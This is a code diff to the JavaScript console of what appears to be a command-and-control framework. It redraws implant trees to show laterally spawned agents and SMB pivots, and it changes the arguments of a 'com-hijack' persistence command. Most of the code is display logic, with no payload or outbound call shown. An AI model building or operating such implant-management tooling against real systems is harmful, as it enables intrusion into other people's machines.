@@ -5723,10 +5723,12 @@ function renderAgentTree() {
     canvas.appendChild(el);
   }
 
-  direct.forEach(a=>{
-    _addTreeAgent(a,'c2');
-    (childrenOf[a.id]||[]).forEach(piv=>_addTreeAgent(piv,a.id));
-  });
+  function _addTreeDirect(a, parentId) {
+    _addTreeAgent(a, parentId);
+    (childrenOf[a.id]||[]).forEach(piv=>_addTreeAgent(piv, a.id));
+    (lateralChildren[a.id]||[]).forEach(c=>_addTreeDirect(c, a.id));
+  }
+  rootDirect.forEach(a=>_addTreeDirect(a,'c2'));
   orphans.forEach(piv=>_addTreeAgent(piv,'c2'));
 
   _redrawTreeLines();
@@ -5792,13 +5794,25 @@ function renderAgentCS() {
     (childrenOf[pid]=childrenOf[pid]||[]).push(p);
   });
 
+  // Non-SMB laterally-spawned agents (parent_id points to another direct agent)
+  const directById2={};
+  direct.forEach(a=>directById2[a.id]=a);
+  const lateralChildrenCS={}, rootDirectCS=[];
+  direct.forEach(a=>{
+    const par=a.parent_id && directById2[a.parent_id] ? directById2[a.parent_id] : null;
+    if(par)(lateralChildrenCS[par.id]=lateralChildrenCS[par.id]||[]).push(a);
+    else rootDirectCS.push(a);
+  });
+
   // RT tree
   const rtRoot=_mkRTN('__c2__');
-  direct.forEach(a=>{
+  function _addDirectCS(a, parentNode) {
     const rn=_mkRTN(a.id);
     (childrenOf[a.id]||[]).forEach(p=>rn.children.push(_mkRTN(p.id)));
-    rtRoot.children.push(rn);
-  });
+    (lateralChildrenCS[a.id]||[]).forEach(c=>_addDirectCS(c, rn));
+    parentNode.children.push(rn);
+  }
+  rootDirectCS.forEach(a=>_addDirectCS(a, rtRoot));
   (childrenOf['__c2__']||[]).forEach(p=>rtRoot.children.push(_mkRTN(p.id)));
 
   _rtLayout(rtRoot, X_STEP, Y_STEP);
@@ -5818,12 +5832,14 @@ function renderAgentCS() {
 
   // Connection layout
   _csLayout=[];
-  direct.forEach(a=>{
+  function _addCSEdge(a, parentId) {
     const isDead=agentStatus(a).color==='gray';
-    _csLayout.push({parentId:'c2',agentId:a.id,
+    _csLayout.push({parentId,agentId:a.id,
       col:edgeColor(a.transport,isDead),dash:isDead?'8 4':transportDash(a.transport),
       agent:a,sleep:a.sleep_sec,jitter:a.jitter_pct});
-  });
+    (lateralChildrenCS[a.id]||[]).forEach(c=>_addCSEdge(c, a.id));
+  }
+  rootDirectCS.forEach(a=>_addCSEdge(a, 'c2'));
   pivots.forEach(p=>{
     const isDead=agentStatus(p).color==='gray';
     _csLayout.push({parentId:p._par?p._par.id:'c2',agentId:p.id,
@@ -6610,9 +6626,11 @@ function renderAgentNetwork() {
   const isSmb = a => ['smb','pipe'].includes((a.transport||'').toLowerCase());
   const direct = liveAgents.filter(a => !isSmb(a));
   const pivots  = liveAgents.filter(a => isSmb(a));
+  const directByIdNet={};
+  direct.forEach(a=>directByIdNet[a.id]=a);
   const childrenOf = {};
   pivots.forEach(p => {
-    const par = direct.find(d=>d.hostname===p.hostname);
+    const par = direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname);
     const pid = par ? par.id : '__c2__';
     (childrenOf[pid] = childrenOf[pid]||[]).push(p);
   });
@@ -6636,9 +6654,12 @@ function renderAgentNetwork() {
   });
 
   // Build edges
-  direct.forEach(a => _netEdges.push({s:'__c2__', t:a.id, col:edgeColor(a.transport, agentStatus(a).color==='gray'), dead:agentStatus(a).color==='gray'}));
+  direct.forEach(a => {
+    const src = (a.parent_id && directByIdNet[a.parent_id]) ? a.parent_id : '__c2__';
+    _netEdges.push({s:src, t:a.id, col:edgeColor(a.transport, agentStatus(a).color==='gray'), dead:agentStatus(a).color==='gray'});
+  });
   pivots.forEach(p => {
-    const par = direct.find(d=>d.hostname===p.hostname);
+    const par = direct.find(d=>d.id===p.parent_id) || direct.find(d=>d.hostname===p.hostname);
     _netEdges.push({s:par?par.id:'__c2__', t:p.id, col:edgeColor(p.transport,agentStatus(p).color==='gray'), dead:agentStatus(p).color==='gray'});
   });
 
@@ -10108,7 +10129,7 @@ async function dispatchConsoleCmd(agentID, cmdLine) {
         taskArgs = 'rm ' + cp[1];
       } else if (cp.length >= 2) {
         taskType = 'COM_HIJACK';
-        taskArgs = JSON.stringify({clsid: cp[0], path: cp[1]});
+        taskArgs = JSON.stringify({clsid: cp[0], dll: cp[1], path: cp[1]});
       } else {
         addConsoleOutput(
           'uso: com-hijack <CLSID> <dll.dll>\n     com-hijack rm <CLSID>\n\n' +
